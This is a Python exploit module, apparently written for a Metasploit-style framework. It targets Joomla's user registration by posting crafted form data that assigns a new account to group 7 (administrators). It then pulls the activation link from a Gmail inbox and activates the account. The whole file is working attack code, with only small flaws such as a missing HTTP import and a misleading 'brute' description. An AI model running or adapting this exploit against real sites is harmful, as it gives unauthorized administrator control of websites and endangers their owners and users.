#  Copyright 2012 Kid :">

from msf.core.templates import Templates
# from msf.lib.net.http import HTTP
from msf.lib.mail.gmail import Gmail
from msf.config import CONFIG

from random import randint
from re import search, DOTALL
from time import sleep
class Module(Templates):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.version		= 1
		self.author			= [ 'Kid' ]
		self.description	= 'Brute joomla administrator account'
		self.detailed_description	= 'This module retreives connect with dictionary username and password'
		#########################################
		self.options.add_string('URL', 'Link login page')
	def run(self, frmwk, args):
		url 				= self.options['URL']
		email 				= CONFIG.GMAIL_ACCOUNT[0]
		self.username		= 'administrator_' + str(randint(1000,100000))
		self.password 		= '123123123'
		victim				= HTTP(url)
		victim.storecookie	= True
		exploit				= 'jform%5Bname%5D=exploit&jform%5Busername%5D=exploit&jform%5Bpassword1%5D=123123&jform%5Bpassword2%5D=1231233&jform%5Bemail1%5D=pentest%40yahoo.com&jform%5Bemail2%5D=pentest%40yahoo.com&option=com_users&task=registration.register&jform%5Bgroups%5D%5B%5D=7&'
		registry			= 'jform%5Bname%5D={0}&jform%5Busername%5D={0}&jform%5Bpassword1%5D={1}&jform%5Bpassword2%5D={1}&jform%5Bemail1%5D={2}&jform%5Bemail2%5D={2}&option=com_users&task=registration.register&jform%5Bgroups%5D%5B%5D=7&'.format(self.username, self.password, email)
		
		frmwk.print_status('Init token')
		data	= victim.Request(url)
		token	= search('name="([a-zA-Z0-9]{32})"\svalue="1"', data)
		if token:
			token	= token.group(1)
		else:
			token	= ''
		frmwk.print_status('Send false request')
		url	= url + '?task=registration.register'
		victim.Request(url, 'POST', exploit + token + '=1')
		frmwk.print_status('Send exploit request')
		data	= victim.Request(url, 'POST', registry + token + '=1')

		warning	= search('class="warning\smessage">(.*?)</dd>', data, DOTALL)
		message	= search('class="message\smessage">(.*?)</dd>', data, DOTALL)
		if warning:
			frmwk.print_error('Error during exploit : ' + warning.group(1))
			return
		elif message:
			frmwk.print_success('Successful : ' + message.group(1).strip())
			frmwk.print_success('Account login: %s | %s' % (self.username, self.password))
		else:
			frmwk.print_status('HÃªn xui !')
		
		frmwk.print_status('Sleep 30s for mail receiver !')
		sleep(30)
		for email in self.getMail():
			active	= search('(http(.*?)activate&token=(.*?))\s', email['body'], DOTALL)
			if active:
				active_link	= active.group(1)
				frmwk.print_status('Active link: ' + active_link)
				break
		if active_link:
			data	= victim.Request(active_link)
			message	= search('class="message\smessage">(.*?)</dd>', data, DOTALL)
			if message:
				frmwk.print_success('Actived Account: %s | %s' % (self.username, self.password))

	def getMail(self):
		mail	= Gmail()
		mail.login(CONFIG.GMAIL_ACCOUNT[0], CONFIG.GMAIL_ACCOUNT[1])
		mail.getInbox()
		return mail.getInboxContent(2)
